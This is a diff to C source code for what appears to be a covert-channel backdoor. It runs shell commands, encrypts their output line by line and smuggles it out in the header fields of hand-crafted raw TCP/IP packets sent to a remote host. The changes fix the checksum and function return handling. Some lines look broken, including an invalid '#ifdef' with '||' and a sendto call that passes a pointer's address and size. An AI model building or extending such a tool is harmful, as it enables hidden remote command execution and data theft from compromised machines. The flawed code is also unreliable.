@@ -1,7 +1,7 @@
 #include "functionality.h"
 
 int processFile(char *filePath, int socket);
-static int whoAmI(char *buffer);
+static void whoAmI(char *buffer);
 static int createRawTcpSocket();
 static char *createRawTcpPacket(struct sockaddr_in *sin);
 
@@ -16,6 +16,7 @@ void executeSystemCall(char *command)
     struct tm *timeStruct = NULL;
     struct sockaddr_in *sin = NULL;
     time_t t;
+    unsigned short sum = 0;
     FILE *results = NULL;
     
     // Execute and open the pipe for reading
@@ -52,14 +53,18 @@ void executeSystemCall(char *command)
     {
         // Copy the line and encrypt it
         encryptedField = encrypt_data(line, date, bytesRead);
+        
+        
 #ifdef __APPLE__
         memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(__uint32_t));
-        memcpy(buffer + sizeof(struct ip) + 16,
-               csum((unsigned short *)buffer, 5), sizeof(u_short));
+        // Get the checksum for the IP packet
+        sum = csum((unsigned short *)buffer, 5);
+        memcpy(buffer + sizeof(struct ip) + 16, &sum, sizeof(u_short));
 #else
         memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(unsigned long));
-        memcpy(buffer + sizeof(struct ip) + 16,
-               csum((unsigned short *)buffer, 5), sizeof(unsigned short));
+        // Get the checksum for the IP packet
+        sum = csum((unsigned short *)buffer, 5);
+        memcpy(buffer + sizeof(struct ip) + 16, &sum, sizeof(unsigned short));
 #endif
         sendto(socket, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0,
                (struct sockaddr *)&sin, sizeof(sin));
@@ -173,7 +178,7 @@ char *createRawTcpPacket(struct sockaddr_in *sin)
     memset(buffer, 0, sizeof(struct ip) + sizeof(struct tcphdr));
     
     // IP structure
-#ifdef __APPLE__
+#ifdef __APPLE__ || __USE_BSD
     iph->ip_hl = 5;
     iph->ip_v = 4;
     iph->ip_tos = 16;
@@ -229,7 +234,7 @@ char *createRawTcpPacket(struct sockaddr_in *sin)
 	return buffer;
 }
 
-static int whoAmI(char *buffer)
+static void whoAmI(char *buffer)
 {
     struct hostent *hp;
     struct in_addr **addr;
@@ -247,7 +252,7 @@ static int whoAmI(char *buffer)
     
     addr = (struct in_addr **)hp->h_addr_list;
     
-    return strncpy(buffer, inet_ntoa(**addr), sizeof(struct in_addr));
+    strncpy(buffer, inet_ntoa(**addr), sizeof(struct in_addr));
 }
 
 static int createRawTcpSocket()
